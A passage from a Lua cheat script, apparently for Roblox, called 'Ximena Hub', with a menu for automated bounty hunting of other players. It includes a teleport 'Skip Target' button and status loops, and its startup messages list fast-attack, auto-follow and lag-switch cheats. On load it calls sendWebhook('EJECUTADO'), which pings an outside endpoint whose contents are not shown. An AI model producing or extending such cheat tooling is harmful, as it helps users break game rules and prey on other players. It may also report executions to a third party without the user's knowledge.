    Value = _G.G_AutoBountyAutoEquip,
    Callback = function(v) _G.G_AutoBountyAutoEquip = v end
})

TabBounty:Section({ Title = "Acciones Rápidas" })

TabBounty:Button({
    Title = "🎯 Skip Target",
    Callback = function()
        local me = lp.Character
        local hrp = me and me:FindFirstChild("HumanoidRootPart")
        if hrp then hrp.CFrame = hrp.CFrame + Vector3.new(0, 500, 0) end
        currentTarget = nil
    end
})

--==================== INIT ====================
task.defer(function()
    WindUI:Notify({
        Title = "👑 Ximena Hub ❤️",
        Content = "Auto Bounty Turbo + Auto Follow + SafeZone cargado",
        Duration = 5
    })
    sendWebhook("EJECUTADO")
    print("👑 Ximena Hub ❤️ by Tommy cargado")
    print("   → Fruit M1 Void + Fast Attack Turbo")
    print("   → Auto Follow activo")
    print("   → Auto-Lag Switch activo")
    print("   → Solo Players nivel 2200+")
    print("   → SafeZone fixed")
end)

task.spawn(function()
    while task.wait(1) do
        if _G.G_AutoBounty then
            updateStatus(autoBountyRunning and ("Hunting " .. (currentTarget and currentTarget.Name or "None")) or "Inactivo")
        else
            updateStatus("Inactivo")
        end
    end
end)
